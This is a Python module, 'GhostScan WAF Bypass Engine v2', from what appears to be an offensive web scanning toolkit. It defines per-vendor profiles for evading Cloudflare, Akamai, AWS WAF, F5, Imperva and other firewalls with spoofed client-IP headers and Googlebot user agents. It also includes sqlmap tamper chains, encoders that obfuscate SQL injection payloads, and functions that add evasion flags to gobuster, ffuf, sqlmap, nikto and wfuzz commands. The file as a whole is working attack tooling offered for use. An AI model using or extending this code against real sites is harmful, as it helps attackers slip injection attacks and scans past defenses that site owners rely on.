#!/usr/bin/env python3
"""
GhostScan - WAF Bypass Engine v2
Fully integrated — patches sessions, encodes payloads, modifies tool CLI args.
Profiles: CloudFlare, Akamai, AWS-WAF, F5, Imperva, ModSecurity, Wordfence, Sucuri, generic.
"""

import random
import time
import re
import urllib.parse
from typing import Optional, List
from modules.utils import log, Colors


# ── WAF BYPASS PROFILES ───────────────────────────────────────────────────────
WAF_PROFILES = {
    "cloudflare": {
        "headers": {
            "CF-Connecting-IP":   "127.0.0.1",
            "X-Forwarded-For":    "127.0.0.1",
            "X-Real-IP":          "127.0.0.1",
            "X-Originating-IP":   "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        ],
        "sqlmap_tamper": "space2comment,randomcase,charencode,between",
        "techniques":    ["case_variation", "url_encode", "unicode_encode",
                          "comment_insertion", "whitespace_injection"],
        "delay_range":   (0.8, 2.5),
        "gobuster_delay": "500ms",
        "ffuf_rate":     "30",
    },
    "akamai": {
        "headers": {
            "X-Forwarded-For":  "127.0.0.1",
            "True-Client-IP":   "127.0.0.1",
            "X-Real-IP":        "127.0.0.1",
            "Pragma":           "akamai-x-get-request-id",
            "X-Akamai-Debug":   "true",
        },
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        ],
        "sqlmap_tamper": "space2comment,charunicodeencode,randomcase,between",
        "techniques":    ["double_url_encode", "unicode_encode", "hex_encode", "case_variation"],
        "delay_range":   (1.0, 3.5),
        "gobuster_delay": "800ms",
        "ffuf_rate":     "20",
    },
    "aws-waf": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Amzn-Trace-Id":   "Root=bypass",
            "X-Real-IP":         "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ],
        "sqlmap_tamper": "space2comment,randomcase,between",
        "techniques":    ["url_encode", "comment_insertion", "case_variation"],
        "delay_range":   (0.3, 1.2),
        "gobuster_delay": "300ms",
        "ffuf_rate":     "50",
    },
    "f5": {
        "headers": {
            "X-Forwarded-For": "127.0.0.1",
            "X-F5-IP":         "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        ],
        "sqlmap_tamper": "charunicodeencode,space2comment,randomcase,multiplespaces",
        "techniques":    ["double_url_encode", "unicode_encode", "multiline_payload"],
        "delay_range":   (0.5, 2.0),
        "gobuster_delay": "400ms",
        "ffuf_rate":     "40",
    },
    "imperva": {
        "headers": {
            "X-Forwarded-For":     "127.0.0.1",
            "X-Real-IP":           "127.0.0.1",
            "Incapsula-Client-IP": "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ],
        "sqlmap_tamper": "space2comment,charencode,randomcase,between,multiplespaces",
        "techniques":    ["url_encode", "case_variation", "comment_insertion", "whitespace_injection"],
        "delay_range":   (1.0, 3.0),
        "gobuster_delay": "700ms",
        "ffuf_rate":     "25",
    },
    "modsecurity": {
        "headers": {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ],
        "sqlmap_tamper": "space2comment,randomcase,charencode,between,equaltolike",
        "techniques":    ["url_encode", "case_variation", "comment_insertion",
                          "whitespace_injection", "hex_encode"],
        "delay_range":   (0.3, 1.5),
        "gobuster_delay": "300ms",
        "ffuf_rate":     "40",
    },
    "wordfence": {
        "headers": {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ],
        "sqlmap_tamper": "space2comment,randomcase,charencode",
        "techniques":    ["case_variation", "url_encode", "comment_insertion"],
        "delay_range":   (0.5, 2.0),
        "gobuster_delay": "400ms",
        "ffuf_rate":     "35",
    },
    "sucuri": {
        "headers": {
            "X-Forwarded-For":    "127.0.0.1",
            "X-Real-IP":          "127.0.0.1",
            "X-Sucuri-Clientip":  "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ],
        "sqlmap_tamper": "space2comment,randomcase",
        "techniques":    ["case_variation", "url_encode"],
        "delay_range":   (1.0, 3.0),
        "gobuster_delay": "600ms",
        "ffuf_rate":     "25",
    },
    "generic": {
        "headers": {
            "X-Forwarded-For":    "127.0.0.1",
            "X-Real-IP":          "127.0.0.1",
            "X-Originating-IP":   "127.0.0.1",
            "X-Remote-IP":        "127.0.0.1",
            "X-Remote-Addr":      "127.0.0.1",
            "X-Client-IP":        "127.0.0.1",
            "Forwarded":          "for=127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
        },
        "user_agents": [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        ],
        "sqlmap_tamper": "space2comment,randomcase,charencode",
        "techniques":    ["case_variation", "url_encode", "comment_insertion", "whitespace_injection"],
        "delay_range":   (0.5, 2.0),
        "gobuster_delay": "400ms",
        "ffuf_rate":     "40",
    },
}

BROWSER_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Wget/1.21.3",
    "curl/7.88.1",
]


class WafBypass:
    """
    Full WAF evasion engine.
    Usage:
        bypass = WafBypass("cloudflare", "normal")
        bypass.patch_session(session)          # patch requests.Session
        bypass.throttle()                       # call between requests
        cmd = bypass.patch_gobuster_args(cmd)  # patch tool CLI args
        payload = bypass.encode_payload(p)     # encode injection payload
    """

    def __init__(self, waf_name: str = "generic", intensity: str = "normal"):
        self.waf_key    = self._normalise(waf_name)
        self.profile    = WAF_PROFILES.get(self.waf_key, WAF_PROFILES["generic"])
        self.intensity  = intensity
        self._req_count = 0
        self._active    = True

    # ── SESSION PATCHING (requests.Session) ───────────────────────────────────

    def patch_session(self, session) -> None:
        """
        Fully patch a requests.Session with evasion headers, UA, and browser-like behaviour.
        Call ONCE after creating the session.
        """
        if not session or not self._active:
            return

        # Evasion / IP spoofing headers
        session.headers.update(self.profile.get("headers", {}))

        # Realistic browser UA
        ua_list = self.profile.get("user_agents", BROWSER_USER_AGENTS)
        session.headers["User-Agent"] = random.choice(ua_list)

        # Full browser header set — looks like real Firefox/Chrome
        session.headers.update({
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest":  "document",
            "Sec-Fetch-Mode":  "navigate",
            "Sec-Fetch-Site":  "none",
            "Sec-Fetch-User":  "?1",
            "Cache-Control":   "max-age=0",
            "DNT":             "1",
        })

        log(f"    [WAF Bypass] Profile: {self.waf_key} | UA: {session.headers['User-Agent'][:60]}", Colors.CYAN)

    def rotate_ua(self, session) -> None:
        """Rotate UA every 20 requests."""
        if self._req_count % 20 == 0:
            ua_list = self.profile.get("user_agents", BROWSER_USER_AGENTS)
            session.headers["User-Agent"] = random.choice(ua_list)

    def throttle(self) -> None:
        """Jittered delay between requests — avoids rate-based detection."""
        lo, hi = self.profile.get("delay_range", (0.2, 0.8))
        mult = {"passive": 2.5, "normal": 1.0, "aggressive": 0.2}.get(self.intensity, 1.0)
        delay = random.uniform(lo * mult, hi * mult)
        if delay > 0.05:
            time.sleep(delay)
        self._req_count += 1
        # Longer break every 50 requests to cool down
        if self._req_count % 50 == 0:
            time.sleep(random.uniform(3, 8))

    # ── PAYLOAD ENCODING ──────────────────────────────────────────────────────

    def encode_payload(self, payload: str, technique: str = None) -> str:
        """Encode payload using WAF-specific technique."""
        if technique is None:
            techs = self.profile.get("techniques", ["url_encode"])
            technique = random.choice(techs)
        encoders = {
            "url_encode":           self._url_encode,
            "double_url_encode":    self._double_url_encode,
            "unicode_encode":       self._unicode_encode,
            "hex_encode":           self._hex_encode,
            "html_entity":          self._html_entity,
            "case_variation":       self._case_variation,
            "comment_insertion":    self._insert_comments,
            "whitespace_injection": self._whitespace_injection,
            "multiline_payload":    self._multiline,
        }
        return encoders.get(technique, self._url_encode)(payload)

    def encode_all(self, payload: str) -> List[str]:
        """Return payload encoded with every profile technique."""
        results = [payload]
        for tech in self.profile.get("techniques", []):
            try:
                enc = self.encode_payload(payload, tech)
                if enc and enc != payload:
                    results.append(enc)
            except Exception:
                pass
        return list(dict.fromkeys(results))  # deduplicate, preserve order

    # ── TOOL CLI PATCHING ─────────────────────────────────────────────────────

    def patch_gobuster_args(self, cmd: list) -> list:
        """Add WAF evasion to gobuster command."""
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        delay = self.profile.get("gobuster_delay", "400ms")
        evasion = [
            "-a", ua,
            "--random-agent",
            "--delay", delay,
            "-H", f"X-Forwarded-For: 127.0.0.1",
            "-H", f"X-Real-IP: 127.0.0.1",
            "-k",   # skip TLS verify
        ]
        return cmd + evasion

    def patch_ffuf_args(self, cmd: list) -> list:
        """Add WAF evasion to ffuf command."""
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        rate = self.profile.get("ffuf_rate", "40")
        mult = {"passive": "0.3", "normal": "1", "aggressive": "3"}.get(self.intensity, "1")
        effective_rate = str(int(float(rate) * float(mult)))
        evasion = [
            "-H", f"User-Agent: {ua}",
            "-H", "X-Forwarded-For: 127.0.0.1",
            "-H", "X-Real-IP: 127.0.0.1",
            "-rate", effective_rate,
            "-timeout", "15",
            "-k",
        ]
        return cmd + evasion

    def patch_sqlmap_args(self, cmd: list) -> list:
        """Add WAF tamper scripts and evasion to sqlmap."""
        tamper = self.profile.get("sqlmap_tamper", "space2comment,randomcase,charencode")
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        lo, hi = self.profile.get("delay_range", (0.5, 2.0))
        delay = str(round(random.uniform(lo, hi), 1))
        evasion = [
            "--tamper",  tamper,
            "--random-agent",
            "--delay",   delay,
            "--headers", f"X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1",
            "--timeout", "15",
            "--retries", "3",
        ]
        return cmd + evasion

    def patch_nikto_args(self, cmd: list) -> list:
        """Add evasion to nikto."""
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        evasion_map = {"passive": "1", "normal": "1234", "aggressive": "12345678"}
        evasion_level = evasion_map.get(self.intensity, "1234")
        return cmd + ["-useragent", ua, "-evasion", evasion_level]

    def patch_wfuzz_args(self, cmd: list) -> list:
        """Add evasion to wfuzz."""
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        lo, hi = self.profile.get("delay_range", (0.2, 0.8))
        return cmd + [
            "-H", f"User-Agent: {ua}",
            "-H", "X-Forwarded-For: 127.0.0.1",
            "-s", str(round(random.uniform(lo, hi), 2)),
        ]

    def patch_curl_args(self, cmd: list) -> list:
        """Add evasion headers to curl command."""
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        additions = [
            "-A", ua,
            "-H", "X-Forwarded-For: 127.0.0.1",
            "-H", "X-Real-IP: 127.0.0.1",
            "-k",  # insecure TLS
        ]
        return cmd + additions

    def get_headers_dict(self) -> dict:
        """Return bypass headers as a plain dict (for requests, etc.)."""
        ua = random.choice(self.profile.get("user_agents", BROWSER_USER_AGENTS))
        headers = dict(self.profile.get("headers", {}))
        headers["User-Agent"] = ua
        return headers

    def get_tamper_scripts(self) -> str:
        """Return sqlmap tamper string for this WAF."""
        return self.profile.get("sqlmap_tamper", "space2comment,randomcase")

    @property
    def waf_name(self) -> str:
        return self.waf_key

    @property
    def delay_range(self) -> tuple:
        return self.profile.get("delay_range", (0.2, 0.8))

    # ── PAYLOAD ENCODERS ──────────────────────────────────────────────────────

    def _url_encode(self, p: str) -> str:
        return urllib.parse.quote(p, safe="")

    def _double_url_encode(self, p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

    def _unicode_encode(self, p: str) -> str:
        return "".join(
            f"\\u{ord(c):04x}" if (ord(c) > 127 or c in "<>\"'&=()") else c
            for c in p
        )

    def _hex_encode(self, p: str) -> str:
        if re.match(r"^[a-zA-Z0-9_\s]+$", p):
            return "0x" + p.encode().hex()
        return p

    def _html_entity(self, p: str) -> str:
        m = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "&": "&amp;"}
        return "".join(m.get(c, c) for c in p)

    def _case_variation(self, p: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p))

    def _insert_comments(self, p: str) -> str:
        result = re.sub(
            r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|TABLE|INTO)\b",
            lambda m: m.group(0) + "/**/",
            p, flags=re.I
        )
        return result if result != p else p.replace(" ", "/**/")

    def _whitespace_injection(self, p: str) -> str:
        alts = ["\t", "%09", "%0a", "%0d", "%0b", "%0c", "\x0b"]
        return p.replace(" ", random.choice(alts))

    def _multiline(self, p: str) -> str:
        mid = len(p) // 2
        return p[:mid] + "%0d%0a" + p[mid:]

    # ── HELPERS ───────────────────────────────────────────────────────────────

    def _normalise(self, name: str) -> str:
        if not name:
            return "generic"
        nl = name.lower()
        for key in WAF_PROFILES:
            if key in nl:
                return key
        return "generic"

    def __repr__(self):
        return f"WafBypass(waf={self.waf_key}, intensity={self.intensity})"


def build_bypass(waf_result: dict, intensity: str = "normal") -> Optional["WafBypass"]:
    """
    Build a WafBypass from a wafw00f detection result dict.
    Always returns a bypass — uses generic profile if no WAF detected.
    """
    waf_name = ""
    if waf_result:
        waf_name = waf_result.get("waf") or waf_result.get("manufacturer") or ""

    if not waf_name or not waf_result.get("detected", False):
        log("  [WAF] No WAF detected — applying generic evasion profile", Colors.DIM)
        return WafBypass("generic", intensity)

    log(f"  [WAF] Detected: {waf_name} — loading bypass profile", Colors.YELLOW)
    bypass = WafBypass(waf_name, intensity)
    log(f"  [WAF] Profile: {bypass.waf_key} | Tamper: {bypass.get_tamper_scripts()}", Colors.CYAN)
    return bypass
